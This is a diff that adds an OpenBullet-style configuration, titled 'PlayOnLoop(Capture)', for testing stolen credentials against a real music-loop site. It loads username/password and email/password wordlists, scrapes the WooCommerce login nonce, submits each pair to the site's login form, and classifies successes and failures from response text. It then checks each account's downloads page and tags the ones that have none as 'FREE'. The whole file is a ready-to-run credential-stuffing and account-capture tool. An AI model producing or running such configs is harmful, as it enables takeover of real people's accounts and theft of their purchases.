@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "PlayOnLoop(Capture)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-28T12:09:22.5047217+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.playonloop.com/my-account/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "woodmart_cookies_1: accepted" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_Token PARSE "<SOURCE>" CSS "[name=woocommerce-login-nonce]" "value" 0 -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.playonloop.com/my-account/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&woocommerce-login-nonce=<TOKEN>&_wp_http_referer=%2Fmy-account%2F&login=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.playonloop.com/my-account/" 
+  HEADER "origin: https://www.playonloop.com" 
+  HEADER "accept-language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY " The password field is empty" 
+    KEY "Invalid email address" 
+    KEY "The password you entered for the" 
+  KEYCHAIN Success OR 
+    KEY "From your account dashboard" 
+REQUEST GET "https://www.playonloop.com/my-account/downloads/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "No downloads available yet." 
